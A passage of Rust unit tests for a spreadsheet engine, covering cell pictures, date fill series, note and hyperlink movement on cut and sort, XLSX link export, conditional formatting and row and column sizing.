    s.execute("data.sort", json!({"range": "A1:B3", "header": true, "keys": [{"column": "A", "order": "asc"}]})).unwrap();
    assert_eq!(cell_picture(&s, "B2").unwrap().alt, "rank one");
    assert_eq!(cell_picture(&s, "B3").unwrap().alt, "rank two");
    s.execute("selection.set", json!({"range": "A1:B3"})).unwrap();
    s.execute("data.filter", json!({})).unwrap();
    s.execute("data.filterBy", json!({"column": "A", "values": ["1"]})).unwrap();
    assert!(s.doc().unwrap().wb.active().unwrap().is_row_hidden(2));
    assert!(cell_picture(&s, "B3").is_some());
    insert_cell_picture(&mut s, "D2", "spill obstruction");
    s.execute("cell.set", json!({"cell": "D1", "input": "=SEQUENCE(2)"})).unwrap();
    assert_eq!(v(&s, "D1"), Value::Error(gridcraft_core::CellError::Spill));
    s.execute("edit.clearContents", json!({"range": "D2"})).unwrap();
    assert_eq!(v(&s, "D1"), Value::Number(1.0));
    assert_eq!(v(&s, "D2"), Value::Number(2.0));
}

#[test]
fn cell_picture_json_save_retains_content_and_pdf_draws_without_error_text() {
    let mut s = s();
    insert_cell_picture(&mut s, "B2", "original pixels");
    let saved = s.execute("file.saveBytes", json!({"format": "json"})).unwrap();
    s.execute("file.open", json!({"name": "pictures.json", "base64": saved["base64"]})).unwrap();
    assert_eq!(cell_picture(&s, "B2").unwrap().data, original_cell_picture());
    let pdf = s.execute("file.exportPdf", json!({"range": "A1:C3"})).unwrap();
    let data = crate::io::base64_decode(pdf["base64"].as_str().unwrap()).unwrap();
    let pdf_text = String::from_utf8_lossy(&data);
    assert!(pdf_text.contains("/Subtype /Image"));
    assert!(!pdf_text.contains("(#VALUE!) Tj"));
    s.execute("home.hideRows", json!({"rows": "2:2"})).unwrap();
    let pdf = s.execute("file.exportPdf", json!({"range": "A1:C3"})).unwrap();
    let data = crate::io::base64_decode(pdf["base64"].as_str().unwrap()).unwrap();
    assert!(!String::from_utf8_lossy(&data).contains("/Subtype /Image"));
}

#[test]
fn cell_picture_side_map_follows_fill_shift_merge_and_undo() {
    let mut s = s();
    insert_cell_picture(&mut s, "B2", "shared pixels");
    let original = cell_picture(&s, "B2").unwrap();
    s.execute("edit.fillDown", json!({"range": "B2:B4"})).unwrap();
    for at in ["B2", "B3", "B4"] {
        assert!(std::sync::Arc::ptr_eq(&original, &cell_picture(&s, at).unwrap()));
    }
    s.execute("edit.autoFill", json!({"source": "A2", "target": "A2:B2", "mode": "formats"})).unwrap();
    assert!(cell_picture(&s, "B2").is_some());
    s.execute("edit.autoFill", json!({"source": "A3", "target": "A3:B3", "mode": "copy"})).unwrap();
    assert!(cell_picture(&s, "B3").is_none());
    s.execute("home.insertCells", json!({"range": "B2", "shift": "down"})).unwrap();
    assert!(cell_picture(&s, "B2").is_none());
    assert!(cell_picture(&s, "B3").is_some());
    assert!(cell_picture(&s, "B5").is_some());
    s.execute("home.deleteCells", json!({"range": "B3", "shift": "up"})).unwrap();
    assert!(cell_picture(&s, "B3").is_none());
    assert!(cell_picture(&s, "B4").is_some());
    s.execute("home.mergeCells", json!({"range": "A4:B4"})).unwrap();
    assert!(cell_picture(&s, "B4").is_none());
    s.execute("edit.undo", json!({})).unwrap();
    assert!(cell_picture(&s, "B4").is_some());
    s.execute("edit.clearAll", json!({"range": "A1:C5"})).unwrap();
    assert!(s.doc().unwrap().wb.active().unwrap().cell_pictures.is_empty());
    insert_cell_picture(&mut s, "XFD1048576", "grid edge");
    assert!(s.execute("home.insertRows", json!({"rows": "1048576:1048576"})).is_err());
    assert_eq!(cell_picture(&s, "XFD1048576").unwrap().alt, "grid edge");
}

#[test]
fn cell_picture_cut_uses_live_source_after_edit() {
    for clear in [false, true] {
        let mut s = s();
        insert_cell_picture(&mut s, "B2", "original");
        s.execute("edit.cut", json!({"range": "B2"})).unwrap();
        if clear {
            s.execute("edit.clearContents", json!({"range": "B2"})).unwrap();
        } else {
            insert_cell_picture(&mut s, "B2", "replacement");
        }
        s.execute("edit.paste", json!({"at": "D2"})).unwrap();
        assert!(cell_picture(&s, "B2").is_none());
        if clear {
            assert!(cell_picture(&s, "D2").is_none());
            assert_eq!(v(&s, "D2"), Value::Empty);
        } else {
            assert_eq!(cell_picture(&s, "D2").unwrap().alt, "replacement");
            assert_eq!(v(&s, "D2"), Value::Error(gridcraft_core::CellError::Value));
        }
    }
}

fn ymd(y: i64, m: i64, d: i64) -> Value {
    Value::Number(gridcraft_core::date::serial_from_ymd(gridcraft_core::DateSystem::D1900, y, m, d).unwrap())
}

fn series_date(seed: &str, range: &str, unit: &str) -> Session {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": seed})).unwrap();
    s.execute("edit.fillSeries", json!({"range": range, "direction": "columns", "type": "date", "dateUnit": unit})).unwrap();
    s
}

#[test]
fn fill_series_month_clamps_to_month_end() {
    let s = series_date("2026-01-31", "A1:A4", "month");
    assert_eq!(v(&s, "A1"), ymd(2026, 1, 31));
    assert_eq!(v(&s, "A2"), ymd(2026, 2, 28));
    assert_eq!(v(&s, "A3"), ymd(2026, 3, 31));
    assert_eq!(v(&s, "A4"), ymd(2026, 4, 30));
    // Mid-month seeds are untouched.
    let s = series_date("2026-01-15", "A1:A4", "month");
    assert_eq!(v(&s, "A4"), ymd(2026, 4, 15));
}

#[test]
fn fill_series_weekday_out_of_range_step_errors() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "45000"})).unwrap();
    let r = s.execute("edit.fillSeries", json!({"range": "A1:A2", "direction": "columns", "type": "date", "dateUnit": "weekday", "step": 1e12}));
    assert!(r.is_err());
    assert_eq!(v(&s, "A2"), Value::Empty);
}

/// A step of a million weekdays moves whole weeks at a time instead of visiting every day, and
/// lands where counting day by day would.
#[test]
fn fill_series_weekday_large_step_is_arithmetic() {
    let mut s = s();
    // 45005 is Monday 20 March 2023; five weekdays on from a Monday is the next Monday.
    s.execute("cell.set", json!({"cell": "A1", "input": "45005"})).unwrap();
    s.execute("edit.fillSeries", json!({"range": "A1:A3", "direction": "columns", "type": "date", "dateUnit": "weekday", "step": 1_000_000}))
        .unwrap();
    assert_eq!(v(&s, "A2"), Value::Number(45005.0 + 1_400_000.0));
    assert_eq!(v(&s, "A3"), Value::Number(45005.0 + 2_800_000.0));
    s.execute("cell.set", json!({"cell": "B1", "input": "45009"})).unwrap();
    s.execute("edit.fillSeries", json!({"range": "B1:B3", "direction": "columns", "type": "date", "dateUnit": "weekday", "step": -1})).unwrap();
    // Friday 24 March 2023 back one weekday at a time: Thursday, Wednesday.
    assert_eq!(v(&s, "B2"), Value::Number(45008.0));
    assert_eq!(v(&s, "B3"), Value::Number(45007.0));
}

#[test]
fn fill_series_month_leap_year() {
    let s = series_date("2028-01-31", "A1:A3", "month");
    assert_eq!(v(&s, "A2"), ymd(2028, 2, 29));
    assert_eq!(v(&s, "A3"), ymd(2028, 3, 31));
    let s = series_date("1996-01-31", "A1:A3", "month");
    assert_eq!(v(&s, "A2"), ymd(1996, 2, 29));
}

#[test]
fn fill_series_year_clamps_leap_day() {
    let s = series_date("2028-02-29", "A1:A5", "year");
    assert_eq!(v(&s, "A2"), ymd(2029, 2, 28));
    assert_eq!(v(&s, "A5"), ymd(2032, 2, 29));
}

#[test]
fn autofill_month_pattern_uses_workbook_date_system() {
    use std::sync::Arc;

    use gridcraft_core::date::serial_from_ymd;
    use gridcraft_core::{DateSystem, RangeRef};

    for sys in [DateSystem::D1900, DateSystem::D1904] {
        for (source, target, seeds, expected) in [
            ("A1:A2", "A1:A6", ["2026-01-31", "2026-03-31"], ["2026-01-31", "2026-03-31", "2026-05-31", "2026-07-31", "2026-09-30", "2026-11-30"]),
            ("A5:A6", "A1:A6", ["2026-09-30", "2026-11-30"], ["2026-01-30", "2026-03-30", "2026-05-30", "2026-07-30", "2026-09-30", "2026-11-30"]),
        ] {
            let mut s = s();
            Arc::make_mut(&mut s.doc_mut().unwrap().wb).date_system = sys;
            let start = RangeRef::parse(source).unwrap().start.a1();
            s.execute("range.setValues", json!({"range": start, "values": [[seeds[0]], [seeds[1]]]})).unwrap();
            s.execute("edit.autoFill", json!({"source": source, "target": target})).unwrap();
            for (row, date) in expected.iter().enumerate() {
                let parts: Vec<i64> = date.split('-').map(|p| p.parse().unwrap()).collect();
                let expected = Value::Number(serial_from_ymd(sys, parts[0], parts[1], parts[2]).unwrap());
                let cell = CellRef::new(row as u32, 0).a1();
                assert_eq!(v(&s, &cell), expected, "{sys:?} {source} -> {target}, {cell}: {date}");
            }
        }
    }
}

#[test]
fn autofill_month_pattern_clamps_to_month_end() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["2026-01-31"], ["2026-03-31"]]})).unwrap();
    s.execute("edit.autoFill", json!({"source": "A1:A2", "target": "A1:A6"})).unwrap();
    assert_eq!(v(&s, "A3"), ymd(2026, 5, 31));
    assert_eq!(v(&s, "A4"), ymd(2026, 7, 31));
    assert_eq!(v(&s, "A5"), ymd(2026, 9, 30));
    assert_eq!(v(&s, "A6"), ymd(2026, 11, 30));
}

#[test]
fn json_import_rebuilds_cell_store_bands_and_counts() {
    // #1008: the JSON reader trusted serialized band keys and the cached length. A file written
    // with a cell in the wrong band lost it from lookup, and a forged count underflowed on the
    // next removal.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A5", "input": "keep"})).unwrap();
    let wb = &s.doc().unwrap().wb;
    let mut v: serde_json::Value = serde_json::to_value(&**wb).unwrap();
    {
        let cells = v["sheets"][0]["cells"].as_object_mut().unwrap();
        let bands = cells["bands"].as_object_mut().unwrap();
        let band = bands.remove("0").expect("the cell is in band 0");
        let cell = band["rows"]["4"]["0"].clone();
        // Off-grid rows never belong in a sheet, whatever band holds them.
        bands.insert("1".into(), band);
        bands.insert("16384".into(), json!({"rows": {"1048576": {"0": cell}}}));
        cells.insert("len".into(), json!(0));
    }
    let bytes = serde_json::to_vec(&v).unwrap();
    let (back, warnings) = crate::io::open_bytes("book.json", &bytes).unwrap();
    let sh = back.active().unwrap();
    let cell = sh.cell(CellRef::parse("A5").unwrap());
    assert_eq!(cell.map(|c| c.value.clone()), Some(Value::text("keep")), "the cell is found where its row says");
    assert_eq!(sh.cells.len(), 1, "the count is rebuilt from the cells");
    assert!(warnings.iter().any(|w| w.contains("outside the 1,048,576")), "{warnings:?}");
    // Removal stays consistent: the forged count used to underflow.
    let mut cells = sh.cells.clone();
    cells.remove(CellRef::parse("A5").unwrap());
    assert_eq!(cells.len(), 0);
}

#[test]
fn notes_comments_and_links_survive_a_json_save() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
    s.execute("review.newNote", json!({"cell": "A1", "text": "note", "author": "Example"})).unwrap();
    s.execute("review.newComment", json!({"cell": "B2", "text": "comment", "author": "Example"})).unwrap();
    s.execute("insert.link", json!({"cell": "C3", "target": "Sheet1!A1", "tooltip": "jump"})).unwrap();
    let wb = &s.doc().unwrap().wb;
    let bytes = crate::io::save_bytes(wb, "book.json").unwrap();
    let (back, _) = crate::io::open_bytes("book.json", &bytes).unwrap();
    let (before, after) = (wb.active().unwrap(), back.active().unwrap());
    assert_eq!((before.comments.len(), before.hyperlinks.len()), (2, 1));
    assert_eq!(after.comments, before.comments);
    assert_eq!(after.hyperlinks, before.hyperlinks);
    assert_eq!(after.cells, before.cells);
}

/// Writing a note or a comment on a cell that has one of the same kind edits its text: the
/// replies, the resolved state, the dates and the note's box stay. `comment` replaced the whole
/// thread, so editing a comment dropped its replies.
#[test]
fn editing_a_note_or_a_comment_keeps_its_thread() {
    let mut s = s();
    s.execute("review.newComment", json!({"cell": "B2", "text": "first", "author": "Ada"})).unwrap();
    s.execute("review.replyComment", json!({"cell": "B2", "text": "reply", "author": "Bob"})).unwrap();
    s.execute("review.resolveComment", json!({"cell": "B2", "resolved": true})).unwrap();
    s.execute("review.newComment", json!({"cell": "B2", "text": "edited"})).unwrap();
    s.execute("review.newNote", json!({"cell": "A1", "text": "note", "author": "Ada"})).unwrap();
    s.execute("review.showNote", json!({"cell": "A1"})).unwrap();
    s.execute("review.newNote", json!({"cell": "A1", "text": "changed"})).unwrap();
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    let thread = &sh.comments[&CellRef::parse("B2").unwrap()];
    assert_eq!((thread.author.as_str(), thread.text.as_str()), ("Ada", "edited"));
    assert_eq!(thread.replies, vec![("Bob".to_string(), "reply".to_string())]);
    assert!(thread.resolved && thread.threaded);
    let note = &sh.comments[&CellRef::parse("A1").unwrap()];
    assert_eq!((note.author.as_str(), note.text.as_str()), ("Ada", "changed"));
    assert!(note.visible && !note.threaded);
    // A note written over a comment replaces it.
    s.execute("review.newNote", json!({"cell": "B2", "text": "plain"})).unwrap();
    let d = s.doc().unwrap();
    let replaced = &d.wb.active().unwrap().comments[&CellRef::parse("B2").unwrap()];
    assert!(!replaced.threaded && replaced.replies.is_empty());
}

/// A cut moves the block's notes, hyperlinks and merged areas with it. The source's cells and
/// pictures were removed but the block's merges and notes were not, so one merged block became
/// two (an empty one left at the old place) and a note ended up on both the old and the new
/// cell. Hyperlinks were not transferred at all.
#[test]
fn a_cut_moves_the_sources_notes_hyperlinks_and_merges() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "y"})).unwrap();
    s.execute("review.newNote", json!({"cell": "A1", "text": "note", "author": "Example"})).unwrap();
    s.execute("insert.link", json!({"cell": "A1", "target": "https://example.com"})).unwrap();
    s.execute("home.mergeCells", json!({"range": "A1:B1"})).unwrap();

    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
    s.execute("edit.paste", json!({"at": "D1"})).unwrap();

    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    let (a1, d1) = (CellRef::parse("A1").unwrap(), CellRef::parse("D1").unwrap());
    assert_eq!(sh.merges, vec![gridcraft_core::RangeRef::parse("D1:E1").unwrap()], "the old merge must not stay behind");
    assert!(!sh.comments.contains_key(&a1), "the note moved");
    assert!(sh.comments.contains_key(&d1), "the note is at the new cell");
    assert!(!sh.hyperlinks.contains_key(&a1), "the hyperlink moved");
    assert!(sh.hyperlinks.contains_key(&d1), "the hyperlink is at the new cell");
    // The cells themselves moved as before; E1 is covered by the pasted merge (merging
    // A1:B1 cleared B1, so only the anchor's content travels).
    assert_eq!(v(&s, "D1"), Value::text("x"));
    assert!(v(&s, "A1").is_empty() && v(&s, "B1").is_empty());
}

/// A cell that holds only a hyperlink (its content cleared) is still part of the block: a
/// cut must carry the link to the destination instead of dropping it with the source.
#[test]
fn a_cut_carries_a_link_only_cell() {
    let mut s = s();
    s.execute("insert.link", json!({"cell": "A1", "target": "https://example.com"})).unwrap();
    let a1 = CellRef::parse("A1").unwrap();
    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
    sh.remove_cell(a1);
    assert!(sh.cell(a1).is_none(), "A1 holds only the link");
    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
    s.execute("edit.paste", json!({"at": "D1"})).unwrap();

    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert!(!sh.hyperlinks.contains_key(&CellRef::parse("A1").unwrap()), "the link left the source");
    assert!(sh.hyperlinks.contains_key(&CellRef::parse("D1").unwrap()), "the link arrived at the destination");
}

/// Page Layout ▸ Print Titles: naming one axis must not clear the other. `print_titles` read
/// both `rows` and `cols` into `Option`s and assigned both unconditionally, so
/// `{"rows":"2:2"}` silently dropped the repeated columns from every printed page.
#[test]
fn print_titles_keeps_the_axis_it_is_not_given() {
    let mut s = s();
    s.execute("pageLayout.printTitles", json!({"rows": "1:1", "cols": "A:A"})).unwrap();
    let titles = |s: &Session| {
        let d = s.doc().unwrap();
        let sh = d.wb.active().unwrap();
        (sh.print.title_rows, sh.print.title_cols)
    };
    assert_eq!(titles(&s), (Some((0, 0)), Some((0, 0))));
    // Only rows: the columns stay.
    s.execute("pageLayout.printTitles", json!({"rows": "2:2"})).unwrap();
    assert_eq!(titles(&s), (Some((1, 1)), Some((0, 0))), "rows alone must not clear the columns");
    // Only columns: the rows stay.
    s.execute("pageLayout.printTitles", json!({"cols": "B:B"})).unwrap();
    assert_eq!(titles(&s), (Some((1, 1)), Some((1, 1))), "columns alone must not clear the rows");
    // An empty value clears that axis on purpose.
    s.execute("pageLayout.printTitles", json!({"cols": ""})).unwrap();
    assert_eq!(titles(&s), (Some((1, 1)), None));
    // A bad range is an error, not a silent wipe.
    assert!(s.execute("pageLayout.printTitles", json!({"rows": "not a range"})).is_err());
    assert_eq!(titles(&s), (Some((1, 1)), None));
}

/// Sorting and removing duplicates rewrite the rows of a range. The cells, pictures, row heights
/// and anchors travel with them, but the notes and hyperlinks hung off their old cells: a note
/// describing one record ended up annotating whatever landed on that row, and on a removed row it
/// annotated blank cells.
#[test]
fn sort_and_remove_duplicates_move_the_rows_notes_and_links() {
    fn setup(values: [&str; 5]) -> Session {
        let mut s = s();
        for (row, text) in values.iter().enumerate() {
            s.execute("cell.set", json!({"cell": format!("A{}", row + 1), "input": text})).unwrap();
        }
        s.execute("review.newNote", json!({"cell": "B5", "text": "late", "author": "Example"})).unwrap();
        s.execute("insert.link", json!({"cell": "B4", "target": "https://example.com/4"})).unwrap();
        s
    }
    let notes_and_links = |s: &Session| {
        let sh = s.doc().unwrap().wb.active().unwrap().clone();
        let cells = ["B2", "B3", "B4", "B5"].map(|c| CellRef::parse(c).unwrap());
        (cells.map(|c| sh.comments.get(&c).map(|m| m.text.clone())), cells.map(|c| sh.hyperlinks.get(&c).map(|h| h.target.clone())))
    };

    // Sort ascending with unique keys d,a,e,b,c: the order becomes a(2), b(4), c(5), d(1), e(3).
    // The note on B5 describes row 5's record ("c"), which lands on row 3; the link on B4
    // describes row 4's record ("b"), which lands on row 2. Both must travel with their record.
    let mut s = setup(["d", "a", "e", "b", "c"]);
    s.execute("data.sort", json!({"range": "A1:B5", "keys": [{"column": "A"}]})).unwrap();
    assert_eq!(v(&s, "A3"), Value::text("c"));
    assert_eq!(v(&s, "A5"), Value::text("e"));
    let (notes, links) = notes_and_links(&s);
    assert_eq!(notes[1], Some("late".to_string()), "the note moved with its record: {notes:?}");
    assert_eq!(links[0], Some("https://example.com/4".to_string()), "the link moved with its record: {links:?}");

    // Remove duplicates keeps the first of each value: rows 3 and 5 go, and row 4's record moves
    // to row 3. The note on B5 described row 5 and goes with it.
    let mut s = setup(["a", "b", "a", "c", "a"]);
    s.execute("data.removeDuplicates", json!({"range": "A1:B5"})).unwrap();
    assert_eq!(v(&s, "A3"), Value::text("c"));
    let (notes, _) = notes_and_links(&s);
    assert!(notes.iter().all(Option::is_none), "a note on a removed row goes with it: {notes:?}");
}

/// Insert › Link sorts a target as Excel's dialog does: a sheet reference, a defined name or `#…` is
/// a place in this document, anything else an existing file or web page. A file saved as a
/// `location` opens nothing in Excel (#800).
#[test]
fn links_to_files_are_saved_as_external_relationships() {
    use std::io::Read;
    let mut s = s();
    s.execute("formulas.defineName", json!({"name": "Price", "refersTo": "=Sheet1!$A$1"})).unwrap();
    s.execute("insert.table", json!({"range": "F1:G3", "name": "Sales"})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Q#1"})).unwrap();
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    let links = [
        ("A1", "Source.xlsx", true),
        ("A2", r"C:\Temp\Book.xlsx", true),
        ("A3", r"..\Reports\Q1.xlsx", true),
        ("A4", "Other.xlsx#Sheet1!A2", true),
        ("A5", "https://example.com/a.xlsx", true),
        ("A6", "Sheet1!B2", false),
        ("A7", "#Sheet1!B3", false),
        ("A8", "Price", false),
        ("A9", "'Sheet1'!C4:D5", false),
        ("A10", "Sales", false),
        ("A11", "'Q#1'!B2", false),
    ];
    for (cell, target, _) in links {
        s.execute("insert.link", json!({"cell": cell, "target": target})).unwrap();
    }
    let bytes = gridcraft_xlsx::write_xlsx(&s.doc().unwrap().wb).unwrap();
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(bytes.clone())).unwrap();
    let mut part = |name: &str| {
        let mut text = String::new();
        zip.by_name(name).unwrap().read_to_string(&mut text).unwrap();
        text
    };
    let (sheet, rels) = (part("xl/worksheets/sheet1.xml"), part("xl/worksheets/_rels/sheet1.xml.rels"));
    for (cell, target, external) in links {
        let file = target.split_once('#').map_or(target, |(f, _)| f);
        let as_rel = format!("Target=\"{file}\" TargetMode=\"External\"");
        let as_location = format!("location=\"{}\"", target.trim_start_matches('#'));
        assert_eq!(rels.contains(&as_rel), external, "{cell} {target}: {rels}");
        assert_eq!(sheet.contains(&as_location), !external, "{cell} {target}: {sheet}");
    }
    assert!(sheet.contains("location=\"Sheet1!A2\""), "{sheet}");
    let (back, _) = gridcraft_xlsx::read_xlsx(&bytes).unwrap();
    for (cell, target, external) in links {
        let h = &back.sheet(0).unwrap().hyperlinks[&CellRef::parse(cell).unwrap()];
        assert_eq!((h.target.as_str(), h.external), (target.trim_start_matches('#'), external), "{cell}");
    }
}

#[test]
fn vertical_alignment_commands_and_roundtrip() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "top"})).unwrap();
    s.execute("cell.set", json!({"cell": "A2", "input": "middle"})).unwrap();
    s.execute("cell.set", json!({"cell": "A3", "input": "bottom"})).unwrap();

    s.execute("selection.set", json!({"range": "A1"})).unwrap();
    s.execute("home.alignTop", json!({})).unwrap();

    s.execute("selection.set", json!({"range": "A2"})).unwrap();
    s.execute("home.alignMiddle", json!({})).unwrap();

    s.execute("selection.set", json!({"range": "A3"})).unwrap();
    s.execute("home.alignBottom", json!({})).unwrap();

    let style_of = |s: &Session, cell: &str| {
        let d = s.doc().unwrap();
        d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse(cell).unwrap())).clone()
    };

    assert_eq!(style_of(&s, "A1").align.v, gridcraft_model::VAlign::Top);
    assert_eq!(style_of(&s, "A2").align.v, gridcraft_model::VAlign::Center);
    assert_eq!(style_of(&s, "A3").align.v, gridcraft_model::VAlign::Bottom);

    let d = s.doc().unwrap();
    let bytes = gridcraft_xlsx::write_xlsx(&d.wb).unwrap();
    let (reopened, _) = gridcraft_xlsx::read_xlsx(&bytes).unwrap();
    let reopen_style = |cell: &str| reopened.styles.get(reopened.active().unwrap().style_id(CellRef::parse(cell).unwrap())).clone();
    assert_eq!(reopen_style("A1").align.v, gridcraft_model::VAlign::Top);
    assert_eq!(reopen_style("A2").align.v, gridcraft_model::VAlign::Center);
    assert_eq!(reopen_style("A3").align.v, gridcraft_model::VAlign::Bottom);
}

/// Icon-set thresholds as read from a file (one per icon, the first the lower bound) decide the
/// icon; a rule without thresholds uses Excel's defaults (percent 33 and 67) (#235).
#[test]
fn icon_set_thresholds_from_files_pick_the_icon() {
    use gridcraft_model::{CfRule, CfValueKind, CondFormat};
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[0], [10], [20], [30], [100]]})).unwrap();
    s.execute("home.conditionalFormat", json!({"range": "A1:A5", "rule": {"type": "iconSet", "set": "3Arrows"}})).unwrap();
    let icon = |s: &Session, a: &str| {
        let wb = &s.doc().unwrap().wb;
        crate::cf::CfCache::new().look(wb, 0, CellRef::parse(a).unwrap()).and_then(|l| l.icon).map(|(_, i)| i)
    };
    // Defaults: percent of the 0..100 span, so 30 is still the lowest icon.
    assert_eq!([icon(&s, "A1"), icon(&s, "A4"), icon(&s, "A5")], [Some(0), Some(0), Some(2)]);
    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
    sh.cond_formats = vec![CondFormat {
        ranges: vec![gridcraft_core::RangeRef::parse("A1:A5").unwrap()],
        rule: CfRule::IconSet {
            set: "3Arrows".into(),
            thresholds: vec![CfValueKind::Percent(0.0), CfValueKind::Number(10.0), CfValueKind::Number(25.0)],
            reverse: false,
            show_value: true,
        },
        priority: 1,
        stop_if_true: false,
    }];
    assert_eq!([icon(&s, "A1"), icon(&s, "A2"), icon(&s, "A3"), icon(&s, "A4")], [Some(0), Some(1), Some(1), Some(2)]);
}

/// `home.conditionalFormat` styles take colours the way the other formatting commands do, refuse
/// keys they would drop, and keep a text criterion already written as a string literal.
#[test]
fn conditional_format_styles_take_hex_colours_and_quoted_values() {
    use gridcraft_model::{CfRule, Color, Fill, PatternType};
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Open"], ["Closed"], ["Blocked"]]})).unwrap();
    let rule = |s: &Session, i: usize| s.doc().unwrap().wb.active().unwrap().cond_formats[i].rule.clone();
    let style = |r: &CfRule| match r {
        CfRule::Expression { style, .. } | CfRule::CellIs { style, .. } => (**style).clone(),
        other => panic!("{other:?}"),
    };
    s.execute(
        "home.conditionalFormat",
        json!({"range": "A1:A3", "rule": {"type": "expression", "formula": "=A1=\"Open\"", "style": {"fill": "#FFF2CC", "font": {"bold": true, "color": "#9C0006"}}}}),
    )
    .unwrap();
    let st = style(&rule(&s, 0));
    assert_eq!(st.fill, Fill::solid(Color::Rgb(0xFFF2CC)));
    assert_eq!((st.font.bold, st.font.color), (true, Color::Rgb(0x9C0006)));
    // A fill colour without a pattern is solid; the model's own shape still works.
    s.execute(
        "home.conditionalFormat",
        json!({"range": "A1", "rule": {"type": "expression", "formula": "=TRUE", "style": {"fill": {"fg": "C6EFCE"}}}}),
    )
    .unwrap();
    assert_eq!(style(&rule(&s, 0)).fill, Fill { pattern: PatternType::Solid, fg: Color::Rgb(0xC6EFCE), bg: Color::Auto });
    let internal = json!({"fill": {"pattern": "Solid", "fg": {"Rgb": 16773836}}, "borders": {"left": {"style": "Thin", "color": "#C00000"}}});
    s.execute("home.conditionalFormat", json!({"range": "A1", "rule": {"type": "expression", "formula": "=TRUE", "style": internal}})).unwrap();
    let st = style(&rule(&s, 0));
    assert_eq!((st.fill.fg, st.borders.left.color), (Color::Rgb(0xFFF2CC), Color::Rgb(0xC00000)));
    // `"none"` is no fill (the format only sets the font), as `home.fillColor` reads it.
    s.execute(
        "home.conditionalFormat",
        json!({"range": "A1", "rule": {"type": "expression", "formula": "=TRUE", "style": {"fill": "none", "font": {"bold": true}}}}),
    )
    .unwrap();
    let st = style(&rule(&s, 0));
    assert_eq!((st.fill, st.font.bold), (Fill::default(), true));
    // Keys that would be dropped, leaving a rule that shows nothing, are refused.
    let n = s.doc().unwrap().wb.active().unwrap().cond_formats.len();
    for bad in [json!({"preset": "greenFill"}), json!({"fillColor": "#FFF2CC"}), json!({"fill": "#nothex"}), json!("bold")] {
        let e = s.execute("home.conditionalFormat", json!({"range": "A1", "rule": {"type": "expression", "formula": "=TRUE", "style": bad}}));
        assert!(e.is_err(), "{bad} should be refused");
    }
    assert_eq!(s.doc().unwrap().wb.active().unwrap().cond_formats.len(), n);

    // `"Closed"` (a string literal, as in the file) and `Closed` both match the text Closed.
    for value in ["\"Closed\"", "Closed"] {
        s.execute(
            "home.conditionalFormat",
            json!({"range": "A1:A3", "rule": {"type": "cellIs", "operator": "equal", "value": value, "preset": "greenFill"}}),
        )
        .unwrap();
        assert!(matches!(rule(&s, 0), CfRule::CellIs { ref a, .. } if a == "\"Closed\""), "{value}");
        let wb = s.doc().unwrap().wb.clone();
        let mut cache = crate::cf::CfCache::new();
        let mut fill = |c: &str| cache.look(&wb, 0, CellRef::parse(c).unwrap()).and_then(|l| l.style).map(|st| st.fill.fg);
        assert_eq!(fill("A2"), Some(Color::Rgb(0xC6EFCE)), "{value}");
        s.execute("edit.undo", json!({})).unwrap();
    }
    // Text with quotes inside that isn't one literal is still quoted as text.
    s.execute("home.conditionalFormat", json!({"range": "A1", "rule": {"type": "cellIs", "operator": "equal", "value": "say \"hi\""}})).unwrap();
    assert!(matches!(rule(&s, 0), CfRule::CellIs { ref a, .. } if a == "\"say \"\"hi\"\"\""));
}

#[test]
fn row_height_and_column_width_take_a_list_of_areas() {
    // Issue #341: header drags on a multi-area selection size every selected line in one step.
    let mut s = s();
    s.execute("home.columnWidth", json!({"cols": "B:B,D:E", "width": 120})).unwrap();
    s.execute("home.rowHeight", json!({"rows": "2:2,4:5", "height": 40})).unwrap();
    let widths: Vec<f32> = (0..6).map(|c| s.doc().unwrap().wb.active().unwrap().col_width(c)).collect();
    let heights: Vec<f32> = (0..6).map(|r| s.doc().unwrap().wb.active().unwrap().row_height(r)).collect();
    for c in [1, 3, 4] {
        assert_eq!(widths[c], 120.0, "column {c}");
    }
    for c in [0, 2, 5] {
        assert_ne!(widths[c], 120.0, "column {c}");
    }
    for r in [1, 3, 4] {
        assert_eq!(heights[r], 40.0, "row {r}");
    }
    for r in [0, 2, 5] {
        assert_ne!(heights[r], 40.0, "row {r}");
    }
    assert!(s.execute("home.columnWidth", json!({"cols": "B:B,nope", "width": 50})).is_err());
    assert_eq!(s.doc().unwrap().wb.active().unwrap().col_width(1), 120.0, "a bad list changes nothing");
}

/// Programmatic callers lay out a sheet that isn't the active one: `sheet` (or a `Sheet!` prefix on
/// `rows`, `cols` or `cell`) picks it, instead of being ignored in favour of the active sheet.
#[test]
fn line_sizes_and_freeze_panes_take_a_sheet() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Data"})).unwrap();
    s.execute("sheet.activate", json!({"sheet": "Sheet1"})).unwrap();
    let sheet = |s: &Session, i: usize| s.doc().unwrap().wb.sheets[i].clone();
    let before = sheet(&s, 0);

    s.execute("view.freezePanes", json!({"sheet": "Data", "cell": "A2"})).unwrap();
    s.execute("home.columnWidth", json!({"sheet": "Data", "cols": "A:A", "width": 150})).unwrap();
    s.execute("home.columnWidth", json!({"cols": "Data!B:B,D:D", "chars": 20})).unwrap();
    // A null `sheet` is no `sheet`, as everywhere else: the prefix decides.
